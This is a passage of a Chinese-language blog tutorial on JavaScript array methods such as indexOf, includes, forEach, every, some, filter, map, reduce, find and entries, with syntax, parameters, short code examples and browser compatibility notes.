class="hljs-params">fromIndex</span>)</span>复制代码</code></pre></div><p>参数:</p><p>searchElement(必须):被查找的元素</p><p>fromIndex(可选):开始查找的位置(不能大于等于数组的长度，返回-1)，接受负值，默认值为0。</p><p>严格相等的搜索:</p><p>数组的indexOf搜索跟字符串的indexOf不一样,数组的indexOf使用严格相等<code>===</code>搜索元素，即<strong>数组元素要完全匹配</strong>才能搜索成功。</p><p><strong>注意</strong>：indexOf()不能识别<code>NaN</code></p><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">    let <span class="hljs-keyword">a</span>=[<span class="hljs-string">&#x27;啦啦&#x27;</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">24</span>,NaN]    console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">a</span>.indexOf(<span class="hljs-string">&#x27;啦&#x27;</span>)); <span class="hljs-comment"> // -1 </span>    console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">a</span>.indexOf(<span class="hljs-string">&#x27;NaN&#x27;</span>)); <span class="hljs-comment"> // -1 </span>    console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">a</span>.indexOf(<span class="hljs-string">&#x27;啦啦&#x27;</span>));<span class="hljs-comment"> // 0</span>复制代码</code></pre></div><p>使用场景：</p><ol><li><a href="https://juejin.cn/post/6844903577421365255#heading-10">数组去重</a></li><li>根据获取的数组下标执行操作，改变数组中的值等。</li><li>判断是否存在，执行操作。</li></ol><h4 id="lastIndexOf-查找指定元素在数组中的最后一个位置"><a href="#lastIndexOf-查找指定元素在数组中的最后一个位置" class="headerlink" title="lastIndexOf() 查找指定元素在数组中的最后一个位置"></a>lastIndexOf() 查找指定元素在数组中的最后一个位置</h4><p>定义:  方法返回指定元素,在数组中的最后一个的索引，如果不存在则返回 -1。（从数组后面往前查找）</p><p>语法:</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">    arr.last<span class="hljs-constructor">IndexOf(<span class="hljs-params">searchElement</span>,<span class="hljs-params">fromIndex</span>)</span>复制代码</code></pre></div><p>参数:</p><p>searchElement(必须): 被查找的元素</p><p>fromIndex(可选): 逆向查找开始位置，默认值数组的长度-1，即查找整个数组。</p><p>关于fromIndex有三个规则:</p><ol><li><p>正值。如果该值大于或等于数组的长度，则整个数组会被查找。</p></li><li><p>负值。将其视为从数组末尾向前的偏移。(比如-2，从数组最后第二个元素开始往前查找)</p></li><li><p>负值。其绝对值大于数组长度，则方法返回 -1，即数组不会被查找。</p><div class="hljs code-wrapper"><pre><code class="hljs awk"> let a=[<span class="hljs-string">&#x27;OB&#x27;</span>,<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;Koro1&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;Koro1&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;Koro1&#x27;</span>]; <span class="hljs-regexp">//</span> 数组长度为<span class="hljs-number">10</span> <span class="hljs-regexp">//</span> let b=a.lastIndexOf(<span class="hljs-string">&#x27;Koro1&#x27;</span>,<span class="hljs-number">4</span>); <span class="hljs-regexp">//</span> 从下标<span class="hljs-number">4</span>开始往前找 返回下标<span class="hljs-number">2</span> <span class="hljs-regexp">//</span> let b=a.lastIndexOf(<span class="hljs-string">&#x27;Koro1&#x27;</span>,<span class="hljs-number">100</span>); <span class="hljs-regexp">//</span>  大于或数组的长度 查找整个数组 返回<span class="hljs-number">9</span> <span class="hljs-regexp">//</span> let b=a.lastIndexOf(<span class="hljs-string">&#x27;Koro1&#x27;</span>,-<span class="hljs-number">11</span>); <span class="hljs-regexp">//</span> -<span class="hljs-number">1</span> 数组不会被查找 let b=a.lastIndexOf(<span class="hljs-string">&#x27;Koro1&#x27;</span>,-<span class="hljs-number">9</span>); <span class="hljs-regexp">//</span> 从第二个元素<span class="hljs-number">4</span>往前查找，没有找到 返回-<span class="hljs-number">1</span>复制代码</code></pre></div></li></ol><h4 id="ES7-includes-查找数组是否包含某个元素-返回布尔"><a href="#ES7-includes-查找数组是否包含某个元素-返回布尔" class="headerlink" title="ES7 includes() 查找数组是否包含某个元素 返回布尔"></a>ES7 includes() 查找数组是否包含某个元素 返回布尔</h4><p>定义： 返回一个布尔值，表示某个数组是否包含给定的值</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-built_in">array</span>.includes(searchElement,fromIndex=<span class="hljs-number">0</span>)复制代码</code></pre></div><p>参数：</p><p>searchElement(必须):被查找的元素</p><p>fromIndex(可选):默认值为0，参数表示搜索的起始位置，接受负值。正值超过数组长度，数组不会被搜索，返回false。负值绝对值超过长数组度，重置从0开始搜索。</p><p><strong>includes方法是为了弥补indexOf方法的缺陷而出现的:</strong></p><ol><li>indexOf方法不能识别<code>NaN</code></li><li>indexOf方法检查是否包含某个值不够语义化，需要判断是否不等于<code>-1</code>，表达不够直观</li></ol><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs awk">    let a=[<span class="hljs-string">&#x27;OB&#x27;</span>,<span class="hljs-string">&#x27;Koro1&#x27;</span>,<span class="hljs-number">1</span>,NaN];    <span class="hljs-regexp">//</span> let b=a.includes(NaN); <span class="hljs-regexp">//</span> true 识别NaN    <span class="hljs-regexp">//</span> let b=a.includes(<span class="hljs-string">&#x27;Koro1&#x27;</span>,<span class="hljs-number">100</span>); <span class="hljs-regexp">//</span> false 超过数组长度 不搜索    <span class="hljs-regexp">//</span> let b=a.includes(<span class="hljs-string">&#x27;Koro1&#x27;</span>,-<span class="hljs-number">3</span>);  <span class="hljs-regexp">//</span> true 从倒数第三个元素开始搜索     <span class="hljs-regexp">//</span> let b=a.includes(<span class="hljs-string">&#x27;Koro1&#x27;</span>,-<span class="hljs-number">100</span>);  <span class="hljs-regexp">//</span> true 负值绝对值超过数组长度，搜索整个数组复制代码</code></pre></div><p>兼容性(MDN): chrome47, Firefox 43,Edge 14,Opera 34, Safari 9,IE 未实现。</p><hr><h3 id="遍历方法-12个"><a href="#遍历方法-12个" class="headerlink" title="遍历方法(12个):"></a>遍历方法(12个):</h3><p>js中遍历数组并不会改变原始数组的方法总共有12个:</p><div class="hljs code-wrapper"><pre><code class="hljs vim">    ES5：    forEach、every 、some、 <span class="hljs-built_in">filter</span>、<span class="hljs-keyword">map</span>、reduce、reduceRight、    ES6：    <span class="hljs-keyword">find</span>、findIndex、<span class="hljs-built_in">keys</span>、<span class="hljs-built_in">values</span>、entries复制代码</code></pre></div><h4 id="关于遍历："><a href="#关于遍历：" class="headerlink" title="关于遍历："></a>关于遍历：</h4><ul><li>关于遍历的效率，可以看一下这篇<a href="https://link.juejin.cn/?target=http://louiszhai.github.io/2015/12/18/traverse/%23%E6%B5%8B%E8%AF%95%E5%90%84%E6%96%B9%E6%B3%95%E6%95%88%E7%8E%87">详解JS遍历</a></li><li>尽量不要在遍历的时候，修改后面要遍历的值</li><li>尽量不要在遍历的时候修改数组的长度（删除/添加）</li></ul><h4 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h4><p>定义: 按升序为数组中含有效值的每一项执行一次回调函数。</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">    <span class="hljs-built_in">array</span>.<span class="hljs-keyword">for</span><span class="hljs-constructor">Each(<span class="hljs-params">function</span>(<span class="hljs-params">currentValue</span>, <span class="hljs-params">index</span>, <span class="hljs-params">arr</span>)</span>, thisValue)复制代码</code></pre></div><p>参数:</p><p>function(必须): 数组中每个元素需要调用的函数。</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-comment">// 回调函数的参数</span>    <span class="hljs-number">1.</span> currentValue(必须),数组当前元素的值    <span class="hljs-number">2.</span> index(可选), 当前元素的索引值    <span class="hljs-number">3.</span> arr(可选),数组对象本身复制代码</code></pre></div><p>thisValue(可选):  当执行回调函数时this绑定对象的值，默认值为<code>undefined</code></p><p><strong>关于forEach()你要知道</strong>：</p><ul><li>无法中途退出循环，只能用<code>return</code>退出本次回调，进行下一次回调。</li><li>它总是返回 undefined值,即使你return了一个值。</li></ul><h4 id="下面类似语法同样适用这些规则"><a href="#下面类似语法同样适用这些规则" class="headerlink" title="下面类似语法同样适用这些规则"></a>下面类似语法同样适用这些规则</h4><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-number">1.</span> 对于空数组是不会执行回调函数的    <span class="hljs-number">2.</span> 对于已在迭代过程中删除的元素，或者空元素会跳过回调函数    <span class="hljs-number">3.</span> 遍历次数再第一次循环前就会确定，再添加到数组中的元素不会被遍历。    <span class="hljs-number">4.</span> 如果已经存在的值被改变，则传递给 callback 的值是遍历到他们那一刻的值。复制代码</code></pre></div><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs awk">    let a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, ,<span class="hljs-number">3</span>]; <span class="hljs-regexp">//</span> 最后第二个元素是空的，不会遍历(undefined、null会遍历)    let obj = &#123; name: <span class="hljs-string">&#x27;OBKoro1&#x27;</span> &#125;;    let result = a.forEach(<span class="hljs-keyword">function</span> (value, index, array) &#123;       a[<span class="hljs-number">3</span>] = <span class="hljs-string">&#x27;改变元素&#x27;</span>;      a.push(<span class="hljs-string">&#x27;添加到尾端，不会被遍历&#x27;</span>)      console.log(value, <span class="hljs-string">&#x27;forEach传递的第一个参数&#x27;</span>); <span class="hljs-regexp">//</span> 分别打印 <span class="hljs-number">1</span> ,<span class="hljs-number">2</span> ,改变元素      console.log(this.name); <span class="hljs-regexp">//</span> OBKoro1 打印三次 this绑定在obj对象上      <span class="hljs-regexp">//</span> <span class="hljs-keyword">break</span>; <span class="hljs-regexp">//</span> <span class="hljs-keyword">break</span>会报错      return value; <span class="hljs-regexp">//</span> return只能结束本次回调 会执行下次回调      console.log(<span class="hljs-string">&#x27;不会执行，因为return 会执行下一次循环回调&#x27;</span>)    &#125;, obj);    console.log(result); <span class="hljs-regexp">//</span> 即使return了一个值,也还是返回undefined    <span class="hljs-regexp">//</span> 回调函数也接受接头函数写法复制代码</code></pre></div><h4 id="every-检测数组所有元素是否都符合判断条件"><a href="#every-检测数组所有元素是否都符合判断条件" class="headerlink" title="every 检测数组所有元素是否都符合判断条件"></a>every 检测数组所有元素是否都符合判断条件</h4><p>定义: 方法用于检测数组所有元素是否都符合函数定义的条件</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs delphi">    <span class="hljs-keyword">array</span>.every(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(currentValue, <span class="hljs-keyword">index</span>, arr)</span>, <span class="hljs-title">thisValue</span>)</span><span class="hljs-function">复制代码</span></code></pre></div><p>参数:(这几个方法的参数，语法都类似)</p><p>function(必须): 数组中每个元素需要调用的函数。</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-comment">// 回调函数的参数</span>    <span class="hljs-number">1.</span> currentValue(必须),数组当前元素的值    <span class="hljs-number">2.</span> index(可选), 当前元素的索引值    <span class="hljs-number">3.</span> arr(可选),数组对象本身复制代码</code></pre></div><p>thisValue(可选):  当执行回调函数时this绑定对象的值，默认值为<code>undefined</code></p><p>方法返回值规则:</p><ol><li>如果数组中检测到<strong>有一个元素不满足，则整个表达式返回 false</strong>，且剩余的元素不会再进行检测。</li><li>如果所有元素<strong>都满足条件，则返回 true</strong>。=</li></ol><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">function</span> <span class="hljs-string">isBigEnough(element,</span> <span class="hljs-string">index,</span> <span class="hljs-string">array)</span> &#123;       <span class="hljs-string">return</span> <span class="hljs-string">element</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">10</span><span class="hljs-string">;</span> <span class="hljs-string">//</span> <span class="hljs-string">判断数组中的所有元素是否都大于10</span>    &#125;    <span class="hljs-string">let</span> <span class="hljs-string">result</span> <span class="hljs-string">=</span> [<span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">130</span>, <span class="hljs-number">44</span>]<span class="hljs-string">.every(isBigEnough);</span>   <span class="hljs-string">//</span> <span class="hljs-literal">false</span>    <span class="hljs-string">let</span> <span class="hljs-string">result</span> <span class="hljs-string">=</span> [<span class="hljs-number">12</span>, <span class="hljs-number">54</span>, <span class="hljs-number">18</span>, <span class="hljs-number">130</span>, <span class="hljs-number">44</span>]<span class="hljs-string">.every(isBigEnough);</span> <span class="hljs-string">//</span> <span class="hljs-literal">true</span>    <span class="hljs-string">//</span> <span class="hljs-string">接受箭头函数写法</span>     [<span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">130</span>, <span class="hljs-number">44</span>]<span class="hljs-string">.every(x</span> <span class="hljs-string">=&gt;</span> <span class="hljs-string">x</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">10</span><span class="hljs-string">);</span> <span class="hljs-string">//</span> <span class="hljs-literal">false</span>    [<span class="hljs-number">12</span>, <span class="hljs-number">54</span>, <span class="hljs-number">18</span>, <span class="hljs-number">130</span>, <span class="hljs-number">44</span>]<span class="hljs-string">.every(x</span> <span class="hljs-string">=&gt;</span> <span class="hljs-string">x</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">10</span><span class="hljs-string">);</span> <span class="hljs-string">//</span> <span class="hljs-literal">true</span><span class="hljs-string">复制代码</span></code></pre></div><h4 id="some-数组中的是否有满足判断条件的元素"><a href="#some-数组中的是否有满足判断条件的元素" class="headerlink" title="some 数组中的是否有满足判断条件的元素"></a>some 数组中的是否有满足判断条件的元素</h4><p>定义：数组中的是否有满足判断条件的元素</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs delphi">    <span class="hljs-keyword">array</span>.some(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(currentValue, <span class="hljs-keyword">index</span>, arr)</span>, <span class="hljs-title">thisValue</span>)</span><span class="hljs-function">复制代码</span></code></pre></div><p>参数:(这几个方法的参数，语法都类似)</p><p>function(必须): 数组中每个元素需要调用的函数。</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-comment">// 回调函数的参数</span>    <span class="hljs-number">1.</span> currentValue(必须),数组当前元素的值    <span class="hljs-number">2.</span> index(可选), 当前元素的索引值    <span class="hljs-number">3.</span> arr(可选),数组对象本身复制代码</code></pre></div><p>thisValue(可选):  当执行回调函数时this绑定对象的值，默认值为<code>undefined</code></p><p>方法返回值规则：</p><ol><li><p>如果<strong>有一个元素满足条件，则表达式返回true</strong>, 剩余的元素不会再执行检测。</p></li><li><p>如果<strong>没有满足条件的元素，则返回false</strong>。</p><div class="hljs code-wrapper"><pre><code class="hljs yaml"> <span class="hljs-string">function</span> <span class="hljs-string">isBigEnough(element,</span> <span class="hljs-string">index,</span> <span class="hljs-string">array)</span> &#123;   <span class="hljs-string">return</span> <span class="hljs-string">(element</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">10</span><span class="hljs-string">);</span> <span class="hljs-string">//数组中是否有一个元素大于</span> <span class="hljs-number">10</span> &#125; <span class="hljs-string">let</span> <span class="hljs-string">result</span> <span class="hljs-string">=</span> [<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>]<span class="hljs-string">.some(isBigEnough);</span> <span class="hljs-string">//</span> <span class="hljs-literal">false</span> <span class="hljs-string">let</span> <span class="hljs-string">result</span> <span class="hljs-string">=</span> [<span class="hljs-number">12</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>]<span class="hljs-string">.some(isBigEnough);</span> <span class="hljs-string">//</span> <span class="hljs-literal">true</span><span class="hljs-string">复制代码</span></code></pre></div></li></ol><h4 id="filter-过滤原始数组，返回新数组"><a href="#filter-过滤原始数组，返回新数组" class="headerlink" title="filter 过滤原始数组，返回新数组"></a>filter 过滤原始数组，返回新数组</h4><p>定义: 返回一个新数组, 其包含通过所提供函数实现的测试的所有元素。</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs haxe">    let <span class="hljs-keyword">new</span><span class="hljs-type">_array</span> = arr.filter(<span class="hljs-function"><span class="hljs-keyword">function</span></span>(currentValue, index, arr), thisArg)复制代码</code></pre></div><p>参数:(这几个方法的参数，语法都类似)</p><p>function(必须): 数组中每个元素需要调用的函数。</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-comment">// 回调函数的参数</span>    <span class="hljs-number">1.</span> currentValue(必须),数组当前元素的值    <span class="hljs-number">2.</span> index(可选), 当前元素的索引值    <span class="hljs-number">3.</span> arr(可选),数组对象本身复制代码</code></pre></div><p>thisValue(可选):  当执行回调函数时this绑定对象的值，默认值为<code>undefined</code></p><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">     <span class="hljs-string">let</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> [<span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">16</span>, <span class="hljs-number">40</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">result</span> <span class="hljs-string">=</span> <span class="hljs-string">a.filter(function</span> <span class="hljs-string">(value,</span> <span class="hljs-string">index,</span> <span class="hljs-string">array)</span> &#123;      <span class="hljs-string">return</span> <span class="hljs-string">value</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">18</span><span class="hljs-string">;</span> <span class="hljs-string">//</span> <span class="hljs-string">返回a数组中所有大于18的元素</span>    &#125;<span class="hljs-string">);</span>    <span class="hljs-string">console.log(result,a);//</span> [<span class="hljs-number">32</span>,<span class="hljs-number">33</span>,<span class="hljs-number">40</span>] [<span class="hljs-number">32</span>,<span class="hljs-number">33</span>,<span class="hljs-number">16</span>,<span class="hljs-number">40</span>]<span class="hljs-string">复制代码</span></code></pre></div><h4 id="map-对数组中的每个元素进行处理，返回新的数组"><a href="#map-对数组中的每个元素进行处理，返回新的数组" class="headerlink" title="map 对数组中的每个元素进行处理，返回新的数组"></a>map 对数组中的每个元素进行处理，返回新的数组</h4><p>定义：创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs haxe">    let <span class="hljs-keyword">new</span><span class="hljs-type">_array</span> = arr.map(<span class="hljs-function"><span class="hljs-keyword">function</span></span>(currentValue, index, arr), thisArg)复制代码</code></pre></div><p>参数:(这几个方法的参数，语法都类似)</p><p>function(必须): 数组中每个元素需要调用的函数。</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-comment">// 回调函数的参数</span>    <span class="hljs-number">1.</span> currentValue(必须),数组当前元素的值    <span class="hljs-number">2.</span> index(可选), 当前元素的索引值    <span class="hljs-number">3.</span> arr(可选),数组对象本身复制代码</code></pre></div><p>thisValue(可选):  当执行回调函数时this绑定对象的值，默认值为<code>undefined</code></p><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs xquery"><span class="hljs-keyword">let</span> a = [<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>];<span class="hljs-keyword">let</span> result = a.<span class="hljs-keyword">map</span>(<span class="hljs-keyword">function</span> (<span class="hljs-keyword">value</span>, index, <span class="hljs-keyword">array</span>) &#123;  <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> + <span class="hljs-string">&#x27;新数组的新元素&#x27;</span>&#125;);console.log(result, a); // [<span class="hljs-string">&quot;1新数组的新元素&quot;</span>,<span class="hljs-string">&quot;2新数组的新元素&quot;</span>,<span class="hljs-string">&quot;3新数组的新元素&quot;</span>,<span class="hljs-string">&quot;4新数组的新元素&quot;</span>] [<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>]复制代码</code></pre></div><h4 id="reduce-为数组提供累加器，合并为一个值"><a href="#reduce-为数组提供累加器，合并为一个值" class="headerlink" title="reduce 为数组提供累加器，合并为一个值"></a>reduce 为数组提供累加器，合并为一个值</h4><p>定义：reduce() 方法对累加器和数组中的每个元素（从左到右）应用一个函数，最终合并为一个值。</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs delphi">    <span class="hljs-keyword">array</span>.reduce(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(total, currentValue, currentIndex, arr)</span>, <span class="hljs-title">initialValue</span>)</span><span class="hljs-function">复制代码</span></code></pre></div><p>参数：</p><p>function(必须): 数组中每个元素需要调用的函数。</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-comment">// 回调函数的参数</span>    <span class="hljs-number">1.</span> total(必须)，初始值, 或者上一次调用回调返回的值    <span class="hljs-number">2.</span> currentValue(必须),数组当前元素的值    <span class="hljs-number">3.</span> index(可选), 当前元素的索引值    <span class="hljs-number">4.</span> arr(可选),数组对象本身复制代码</code></pre></div><p>initialValue(可选): 指定第一次回调 的第一个参数。</p><p>回调第一次执行时:</p><ul><li>如果 initialValue 在调用 reduce 时被提供，那么第一个 total 将等于 initialValue，此时 currentValue 等于数组中的第一个值；</li><li>如果 initialValue 未被提供，那么 total 等于数组中的第一个值，currentValue 等于数组中的第二个值。此时如果数组为空，那么将抛出 TypeError。</li><li>如果数组仅有一个元素，并且没有提供 initialValue，或提供了 initialValue 但数组为空，那么回调不会被执行，数组的唯一值将被返回。</li></ul><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">//</span> <span class="hljs-string">数组求和</span>     <span class="hljs-string">let</span> <span class="hljs-string">sum</span> <span class="hljs-string">=</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<span class="hljs-string">.reduce(function</span> <span class="hljs-string">(a,</span> <span class="hljs-string">b)</span> &#123;      <span class="hljs-string">return</span> <span class="hljs-string">a</span> <span class="hljs-string">+</span> <span class="hljs-string">b;</span>    &#125;<span class="hljs-string">,</span> <span class="hljs-number">0</span><span class="hljs-string">);</span>    <span class="hljs-string">//</span> <span class="hljs-number">6</span>    <span class="hljs-string">//</span> <span class="hljs-string">将二维数组转化为一维</span> <span class="hljs-string">将数组元素展开</span>    <span class="hljs-string">let</span> <span class="hljs-string">flattened</span> <span class="hljs-string">=</span> [[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]]<span class="hljs-string">.reduce(</span>      <span class="hljs-string">(a,</span> <span class="hljs-string">b)</span> <span class="hljs-string">=&gt;</span> <span class="hljs-string">a.concat(b),</span>      []    <span class="hljs-string">);</span>     <span class="hljs-string">//</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<span class="hljs-string">复制代码</span></code></pre></div><h4 id="reduceRight-从右至左累加"><a href="#reduceRight-从右至左累加" class="headerlink" title="reduceRight  从右至左累加"></a>reduceRight  从右至左累加</h4><p>这个方法除了与reduce执行方向相反外，其他完全与其一致，请参考上述 reduce 方法介绍。</p><h4 id="ES6：find-amp-findIndex-根据条件找到数组成员"><a href="#ES6：find-amp-findIndex-根据条件找到数组成员" class="headerlink" title="ES6：find()&amp; findIndex() 根据条件找到数组成员"></a>ES6：find()&amp; findIndex() 根据条件找到数组成员</h4><p>find()定义：用于找出第一个符合条件的数组成员，并返回该成员，如果没有符合条件的成员，则返回undefined。</p><p>findIndex()定义：返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1。</p><p>这两个方法</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs haxe">    let <span class="hljs-keyword">new</span><span class="hljs-type">_array</span> = arr.find(<span class="hljs-function"><span class="hljs-keyword">function</span></span>(currentValue, index, arr), thisArg)     let <span class="hljs-keyword">new</span><span class="hljs-type">_array</span> = arr.findIndex(<span class="hljs-function"><span class="hljs-keyword">function</span></span>(currentValue, index, arr), thisArg)复制代码</code></pre></div><p>参数:(这几个方法的参数，语法都类似)</p><p>function(必须): 数组中每个元素需要调用的函数。</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">    <span class="hljs-comment">// 回调函数的参数</span>    <span class="hljs-number">1.</span> currentValue(必须),数组当前元素的值    <span class="hljs-number">2.</span> index(可选), 当前元素的索引值    <span class="hljs-number">3.</span> arr(可选),数组对象本身复制代码</code></pre></div><p>thisValue(可选):  当执行回调函数时this绑定对象的值，默认值为<code>undefined</code></p><p>这两个方法都可以识别<code>NaN</code>,弥补了<code>indexOf</code>的不足.</p><p>eg:</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">        <span class="hljs-comment">// find</span>        let a = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">10</span>].find((n) =&gt; n &lt; <span class="hljs-number">0</span>); <span class="hljs-comment">// 返回元素-5</span>        let b = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">10</span>,NaN].find((n) =&gt; Object.<span class="hljs-keyword">is</span>(NaN, n));  <span class="hljs-comment">// 返回元素NaN</span>        <span class="hljs-comment">// findIndex</span>        let a = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">10</span>].findIndex((n) =&gt; n &lt; <span class="hljs-number">0</span>); <span class="hljs-comment">// 返回索引2</span>        let b = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">-5</span>, <span class="hljs-number">10</span>,NaN].findIndex((n) =&gt; Object.<span class="hljs-keyword">is</span>(NaN, n));  <span class="hljs-comment">// 返回索引4</span>复制代码</code></pre></div><p>浏览器兼容(MDN):Chrome 45,Firefox 25,Opera 32, Safari 8, Edge yes,</p><h4 id="ES6-keys-amp-values-amp-entries-遍历键名、遍历键值、遍历键名-键值"><a href="#ES6-keys-amp-values-amp-entries-遍历键名、遍历键值、遍历键名-键值" class="headerlink" title="ES6 keys()&amp;values()&amp;entries() 遍历键名、遍历键值、遍历键名+键值"></a>ES6 keys()&amp;values()&amp;entries() 遍历键名、遍历键值、遍历键名+键值</h4><p>定义：三个方法都返回一个新的 Array Iterator 对象，对象根据方法不同包含不同的值。</p><p>语法：</p><div class="hljs code-wrapper"><pre><code class="hljs maxima">    <span class="hljs-built_in">array</span>.keys()    <span class="hljs-built_in">array</span>.<span class="hljs-built_in">values</span>()    <span class="hljs-built_in">array</span>.entries()复制代码</code></pre></div><p>参数：无。</p><p>遍历栗子(摘自<a href="https://link.juejin.cn/?target=http://es6.ruanyifeng.com/%23docs/array%23%E6%95%B0%E7%BB%84%E5%AE%9E%E4%BE%8B%E7%9A%84-entries%EF%BC%8Ckeys-%E5%92%8C-values">ECMAScript 6 入门</a>)：</p><div class="hljs code-wrapper"><pre><code class="hljs awk">    <span class="hljs-keyword">for</span> (let index of [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>].keys()) &#123;      console.log(index);    &#125;    <span class="hljs-regexp">//</span> <span class="hljs-number">0</span>    <span class="hljs-regexp">//</span> <span class="hljs-number">1</span>        <span class="hljs-keyword">for</span> (let elem of [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>].values()) &#123;      console.log(elem);    &#125;    <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;a&#x27;</span>    <span class="hljs-regexp">//</span> <span class="hljs-string">&#x27;b&#x27;</span>        <span class="hljs-keyword">for</span> (let [index, elem] of [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>].entries()) &#123;      console.log(index, elem);    &#125;    <span class="hljs-regexp">//</span> <span class="hljs-number">0</span> <span class="hljs-string">&quot;a&quot;</span>    <span class="hljs-regexp">//</span> <span class="hljs-number">1</span> <span class="hljs-string">&quot;b&quot;</span>复制代码</code></pre></div><p>在<code>for..of</code>中如果遍历中途要退出，可以使用<code>break</code>退出循环。</p><p>如果不使用<code>for...of</code>循环，可以手动调用遍历器对象的next方法，进行遍历:</p><div class="hljs code-wrapper"><pre><code class="hljs awk">    let letter = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>];    let entries = letter.entries();    console.log(entries.<span class="hljs-keyword">next</span>().value); <span class="hljs-regexp">//</span> [<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>]    console.log(entries.<span class="hljs-keyword">next</span>().value); <span class="hljs-regexp">//</span> [<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span>]    console.log(entries.<span class="hljs-keyword">next</span>().value); <span class="hljs-regexp">//</span> [<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;c&#x27;</span>]复制代码</code></pre></div><p>entries()浏览器兼容性(MDN):Chrome 38, Firefox 28,Opera 25,Safari 7.1</p><p>keys()浏览器兼容性(MDN):Chrome 38, Firefox 28,Opera 25,Safari 8,</p><p><strong>注意</strong>:目前只有Safari 9支持,，其他浏览器未实现，babel转码器也还未实现</p><hr>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
